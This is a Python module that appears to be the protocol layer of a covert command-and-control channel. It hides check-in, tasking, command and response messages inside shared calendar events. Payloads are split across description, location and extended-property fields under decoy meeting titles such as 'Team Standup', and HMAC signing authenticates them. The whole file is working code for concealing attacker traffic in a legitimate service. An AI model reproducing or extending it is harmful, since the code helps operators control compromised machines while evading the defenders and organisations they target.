"""Protocol V2 — shared calendar dead-drop pack/unpack and event authentication."""

from __future__ import annotations

import hashlib
import hmac as hmac_mod
from typing import Dict, Optional, Tuple

PROTO_VERSION = "2"
MSG_CHECKIN = "checkin"
MSG_TASKING = "tasking"
MSG_CMD = "cmd"
MSG_RESP = "resp"

MAX_DESCRIPTION_BYTES = 7500
MAX_LOCATION_BYTES = 1000
MAX_EXT_PROP_VALUE = 280
MAX_EXT_PROP_KEYS = 20
SINGLE_EVENT_CAPACITY = (
    MAX_DESCRIPTION_BYTES
    + MAX_LOCATION_BYTES
    + (MAX_EXT_PROP_KEYS * MAX_EXT_PROP_VALUE)
)

EVENT_TITLES = [
    "Team Standup",
    "Sprint Planning",
    "1:1 Sync",
    "Design Review",
    "Backlog Grooming",
    "Retro",
    "Tech Sync",
    "Status Update",
    "Project Check-in",
    "Weekly Review",
    "Roadmap Discussion",
    "Architecture Review",
    "QA Sync",
    "Release Planning",
    "Cross-team Sync",
    "Product Alignment",
    "Onboarding Session",
]

# Unlikely in base64 calendar payloads; separates canonical HMAC fields.
_HMAC_FIELD_SEP = b"\x1e"


def pack_event_fields(data: str) -> Tuple[str, str, dict]:
    """Pack data across description, location, and extendedProperties chunks."""
    description = data[:MAX_DESCRIPTION_BYTES]
    remaining = data[MAX_DESCRIPTION_BYTES:]

    location = remaining[:MAX_LOCATION_BYTES]
    remaining = remaining[MAX_LOCATION_BYTES:]

    ext_chunks: Dict[str, str] = {}
    for i in range(MAX_EXT_PROP_KEYS):
        if not remaining:
            break
        ext_chunks[f"chunk_{i}"] = remaining[:MAX_EXT_PROP_VALUE]
        remaining = remaining[MAX_EXT_PROP_VALUE:]

    return description, location, ext_chunks


def _iter_chunk_values(ext_chunks: dict) -> list:
    """Return chunk_* values in order from a props/chunks mapping."""
    values = []
    for i in range(MAX_EXT_PROP_KEYS):
        key = f"chunk_{i}"
        if key not in ext_chunks:
            break
        values.append(ext_chunks[key])
    return values


def canonical_event_payload(
    description: str,
    location: str,
    ext_chunks: Optional[dict] = None,
) -> bytes:
    """Canonical byte sequence for event HMAC (all packed payload fields)."""
    parts = [description.encode("utf-8"), location.encode("utf-8")]
    for value in _iter_chunk_values(ext_chunks or {}):
        parts.append(value.encode("utf-8"))
    return _HMAC_FIELD_SEP.join(parts)


def unpack_event_fields(event: dict) -> str:
    """Reassemble data from description, location, and extendedProperties."""
    data = event.get("description", "")
    data += event.get("location", "")

    props = event.get("extendedProperties", {}).get("private", {})
    for value in _iter_chunk_values(props):
        data += value

    return data


def extract_event_payload_parts(event: dict) -> Tuple[str, str, dict]:
    """Return (description, location, chunk_props) from a calendar event."""
    description = event.get("description", "")
    location = event.get("location", "")
    props = event.get("extendedProperties", {}).get("private", {})
    ext_chunks = {
        f"chunk_{i}": props[f"chunk_{i}"]
        for i in range(MAX_EXT_PROP_KEYS)
        if f"chunk_{i}" in props
    }
    return description, location, ext_chunks


def sign_event_payload(
    hmac_key: Optional[bytes],
    description: str,
    location: str = "",
    ext_chunks: Optional[dict] = None,
) -> str:
    """Compute HMAC-SHA256 over all packed payload fields."""
    if not hmac_key:
        return ""
    payload = canonical_event_payload(description, location, ext_chunks)
    return hmac_mod.new(hmac_key, payload, hashlib.sha256).hexdigest()[:32]


def verify_event_sig(event: dict, hmac_key: Optional[bytes]) -> bool:
    """Verify event HMAC. Returns True if signing disabled or signature valid."""
    if not hmac_key:
        return True

    props = event.get("extendedProperties", {}).get("private", {})
    sig = props.get("event_sig", "")
    if not sig:
        return False

    description, location, ext_chunks = extract_event_payload_parts(event)
    expected = sign_event_payload(hmac_key, description, location, ext_chunks)
    return hmac_mod.compare_digest(sig, expected)
